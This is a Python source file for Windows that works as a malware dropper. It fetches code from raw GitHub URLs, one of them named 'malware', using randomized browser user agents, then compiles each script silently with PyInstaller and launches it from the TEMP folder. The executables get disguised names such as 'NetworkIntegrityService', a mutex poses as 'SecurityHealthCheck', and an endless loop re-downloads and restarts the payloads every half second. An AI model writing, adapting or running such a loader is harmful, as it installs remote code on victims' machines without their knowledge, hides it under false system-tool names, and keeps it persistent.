import os
import sys
import random
import shutil
import subprocess
import urllib.request
import win32api
import win32event
import time
import psutil

def compile_python_to_exe(py_file_path):
    try:
        if py_file_path:
            temp_dir = os.getenv('TEMP')
            dist_folder = os.path.join(temp_dir, "dist")
            build_folder = os.path.join(temp_dir, "build")

            print(f"Pyinstalling for {py_file_path} has started.")
            subprocess.call([
                'pyinstaller',
                '--onefile',
                '--noconsole',
                '--icon=NONE',
                f'--distpath={dist_folder}',
                f'--workpath={build_folder}',
                py_file_path
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)

            print(f"Pyinstalling for {py_file_path} has ended.")
                
            exe_file_path = os.path.join(dist_folder, os.path.basename(py_file_path).replace(".py", ".exe"))
            if os.path.exists(exe_file_path):
                exe_dest = os.path.join(temp_dir, os.path.basename(exe_file_path))
                shutil.move(exe_file_path, exe_dest)
                os.startfile(exe_dest)
                return exe_dest
            else:
                print(f"Error: Exe file not found for {py_file_path}")
                return None
    except Exception as e:
        print(f"Error compiling to exe: {e}")
        return None

def fetch_python_code(url):
    try:
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1",
        ]
        user_agent = random.choice(user_agents)
        headers = {'User-Agent': user_agent}
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req) as response:
            return response.read().decode('utf-8')
    except Exception as e:
        print(f"Error fetching code from {url}: {e}")
        return None

def write_python_file(code, filename):
    try:
        if code:
            temp_dir = os.getenv('TEMP')
            py_file_path = os.path.join(temp_dir, filename)
            with open(py_file_path, 'w', encoding='utf-8') as f:
                f.write(code)
            return py_file_path
        else:
            print(f"Error: No code to write for {filename}")
            return None
    except Exception as e:
        print(f"Error writing file {filename}: {e}")
        return None

def create_mutex(mutex_name):
    try:
        mutex = win32event.CreateMutex(None, 0, mutex_name)
        if win32api.GetLastError() == 183:
            print("Mutex already exists. Exiting.")
            return False
        return True
    except Exception as e:
        print(f"Failed to create mutex: {e}")
        return False

import concurrent.futures

def download_and_compile_scripts(urls_and_filenames):
    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = [executor.submit(
            lambda url, filename: (
                (code := fetch_python_code(url)) and
                (py_file_path := write_python_file(code, filename)) and
                (
                    (exe_file := compile_python_to_exe(py_file_path)) and
                    print(f"Executable created: {exe_file}") or
                    os.remove(py_file_path) if exe_file else print(f"Failed to compile {filename}")
                ) or
                print(f"Failed to write {filename}") if not py_file_path else
                print(f"Failed to fetch code from {url}")
            ), url, filename) for url, filename in urls_and_filenames]
        for future in concurrent.futures.as_completed(futures):
            future.result()

os.system('SecurityHealthCheck.exe ~ Midnight ~')

if os.name == "nt":
    mutex_name = "SecurityHealthCheck"
    if not create_mutex(mutex_name):
        sys.exit(0)

    urls_and_filenames = [
        ("https://raw.githubusercontent.com/247msn/96737693845/refs/heads/main/watchdog1", "SystemResourceMonitor.py"),
        ("https://raw.githubusercontent.com/247msn/96737693845/refs/heads/main/malware", "NetworkIntegrityService.py"),
    ]
    download_and_compile_scripts(urls_and_filenames)

while True:
    for process in psutil.process_iter(['name']):
        if process.info['name'] in ['SystemResourceMonitor.exe', 'NetworkIntegrityService.py']:
            process.terminate()
    download_and_compile_scripts(urls_and_filenames)
    print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]{Fore.GREEN} Downloaded & Compiled ~ because a process wasnt found or was closed")
    time.sleep(0.5)
